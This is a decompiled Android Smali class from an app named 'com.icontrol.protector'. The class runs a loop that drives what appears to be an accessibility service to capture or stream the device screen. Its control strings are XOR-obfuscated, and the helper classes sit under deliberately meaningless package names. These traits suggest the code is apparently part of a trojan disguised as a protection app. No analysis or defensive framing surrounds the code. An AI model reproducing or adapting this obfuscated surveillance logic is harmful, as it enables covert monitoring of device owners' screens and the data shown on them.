.class Lcom/icontrol/protector/WorkServices$d$a;
.super Ljava/lang/Object;
.source "SourceFile"

# interfaces
.implements Ljava/lang/Runnable;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcom/icontrol/protector/WorkServices$d;->d(Landroid/content/Context;I)V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic e:Landroid/content/Context;

.field final synthetic f:I


# direct methods
.method constructor <init>(Landroid/content/Context;I)V
    .locals 0

    iput-object p1, p0, Lcom/icontrol/protector/WorkServices$d$a;->e:Landroid/content/Context;

    iput p2, p0, Lcom/icontrol/protector/WorkServices$d$a;->f:I

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public run()V
    .locals 7

    sget-object v0, Lcom/icontrol/protector/WorkServices;->o:Lcom/icontrol/protector/AccessServices;

    if-nez v0, :cond_0

    return-void

    :cond_0
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v0

    invoke-static {v0, v1}, Lcom/icontrol/protector/WorkServices$d;->f(J)J

    :try_start_0
    sget v0, Lcom/icontrol/protector/WorkServices;->q:I

    int-to-long v0, v0

    invoke-static {v0, v1}, Ljava/lang/Thread;->sleep(J)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :catch_0
    const/4 v0, 0x7

    const/16 v1, 0x8

    :try_start_1
    sget v2, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v3, 0x1e

    if-lt v2, v3, :cond_2

    iget-object v2, p0, Lcom/icontrol/protector/WorkServices$d$a;->e:Landroid/content/Context;

    sget-object v3, Lntidisestablish/neumonoul/floccinaucinih/ab;->Q:Ljava/lang/String;

    sget-object v4, Ljava/lang/Boolean;->FALSE:Ljava/lang/Boolean;

    invoke-static {v2, v3, v4}, Lntidisestablish/neumonoul/floccinaucinih/sq;->c(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Boolean;)Ljava/lang/Boolean;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v2

    const/4 v3, 0x6

    if-eqz v2, :cond_1

    sget-object v2, Lcom/icontrol/protector/WorkServices;->o:Lcom/icontrol/protector/AccessServices;

    invoke-virtual {v2}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v4

    new-array v3, v3, [B

    fill-array-data v3, :array_0

    new-array v5, v1, [B

    fill-array-data v5, :array_1

    invoke-static {v3, v5}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v3

    :goto_0
    iget v5, p0, Lcom/icontrol/protector/WorkServices$d$a;->f:I

    invoke-virtual {v2, v4, v3, v5}, Lcom/icontrol/protector/AccessServices;->a(Landroid/content/Context;Ljava/lang/String;I)V

    goto :goto_1

    :cond_1
    iget-object v2, p0, Lcom/icontrol/protector/WorkServices$d$a;->e:Landroid/content/Context;

    new-array v5, v0, [B

    fill-array-data v5, :array_2

    new-array v6, v1, [B

    fill-array-data v6, :array_3

    invoke-static {v5, v6}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v5

    invoke-static {v2, v5, v4}, Lntidisestablish/neumonoul/floccinaucinih/sq;->c(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Boolean;)Ljava/lang/Boolean;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v2

    if-eqz v2, :cond_2

    sget-object v2, Lcom/icontrol/protector/WorkServices;->o:Lcom/icontrol/protector/AccessServices;

    invoke-virtual {v2}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v4

    new-array v3, v3, [B

    fill-array-data v3, :array_4

    new-array v5, v1, [B

    fill-array-data v5, :array_5

    invoke-static {v3, v5}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v3
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    goto :goto_0

    :catch_1
    :cond_2
    :goto_1
    iget-object v2, p0, Lcom/icontrol/protector/WorkServices$d$a;->e:Landroid/content/Context;

    sget-object v3, Lntidisestablish/neumonoul/floccinaucinih/ab;->Q:Ljava/lang/String;

    sget-object v4, Ljava/lang/Boolean;->FALSE:Ljava/lang/Boolean;

    invoke-static {v2, v3, v4}, Lntidisestablish/neumonoul/floccinaucinih/sq;->c(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Boolean;)Ljava/lang/Boolean;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v2

    if-nez v2, :cond_0

    iget-object v2, p0, Lcom/icontrol/protector/WorkServices$d$a;->e:Landroid/content/Context;

    new-array v0, v0, [B

    fill-array-data v0, :array_6

    new-array v1, v1, [B

    fill-array-data v1, :array_7

    invoke-static {v0, v1}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-static {v2, v0, v4}, Lntidisestablish/neumonoul/floccinaucinih/sq;->c(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Boolean;)Ljava/lang/Boolean;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v0

    if-nez v0, :cond_0

    return-void

    :array_0
    .array-data 1
        0x4ct
        -0x78t
        -0x2ft
        0x31t
        0x1et
        0x15t
    .end array-data

    nop

    :array_1
    .array-data 1
        0x3ft
        -0x15t
        -0x5dt
        0x54t
        0x7bt
        0x7bt
        0x30t
        -0x3dt
    .end array-data

    :array_2
    .array-data 1
        -0x64t
        0x1bt
        0x4t
        -0x2t
        0x61t
        -0x12t
        -0x7ct
    .end array-data

    :array_3
    .array-data 1
        -0x30t
        0x72t
        0x72t
        -0x5ft
        0x12t
        -0x73t
        -0xat
        -0x2bt
    .end array-data

    :array_4
    .array-data 1
        0x64t
        0x51t
        0x73t
        -0x41t
        0x22t
        -0x4bt
    .end array-data

    nop

    :array_5
    .array-data 1
        0x8t
        0x38t
        0x5t
        -0x34t
        0x41t
        -0x39t
        0x6ft
        -0x1dt
    .end array-data

    :array_6
    .array-data 1
        -0xat
        0x48t
        0x32t
        -0x60t
        0x1et
        0x37t
        0x36t
    .end array-data

    :array_7
    .array-data 1
        -0x46t
        0x21t
        0x44t
        -0x1t
        0x6dt
        0x54t
        0x44t
        -0x78t
    .end array-data
.end method
